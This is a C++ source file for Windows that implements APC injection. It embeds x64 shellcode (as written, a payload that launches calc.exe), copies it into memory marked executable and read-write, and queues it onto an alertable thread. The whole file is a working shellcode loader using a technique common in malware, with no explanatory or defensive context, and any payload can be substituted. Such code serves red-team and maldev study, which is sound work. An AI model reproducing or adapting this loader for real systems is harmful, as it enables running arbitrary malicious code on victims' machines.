#include <Windows.h>
#include <cstdio>
#include <processthreadsapi.h>

VOID AlertableFunction2() {

    SleepEx(INFINITE, TRUE);
}

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID pAddress = NULL;
    DWORD dwOldProtection = NULL;


    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);


    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // If hThread is in an alertable state, QueueUserAPC will run the payload directly
    // If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}


int main() {
    char pay[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
    SIZE_T s = sizeof(pay);
    HANDLE hThread;
    getchar();
    // Create a thread that will sit in an alertable state
    hThread = CreateThread(
        NULL,           // default security
        0,              // default stack size
        (LPTHREAD_START_ROUTINE)AlertableFunction2,  // waits alertably
        NULL,           // no parameter
        0,              // run immediately
        NULL            // don't need thread ID
    );
    printf("thread id : %lu", GetThreadId(hThread));

    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d\n", GetLastError());
        return -1;
    }

    // Give the thread a moment to enter the alertable wait
    Sleep(100);

    // Inject the payload via APC
    if (!RunViaApcInjection(hThread, (PBYTE)pay, s)) {
        printf("[!] RunViaApcInjection Failed\n");
    }

    // Keep the main thread alive so the APC can execute
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

	return 0;
}

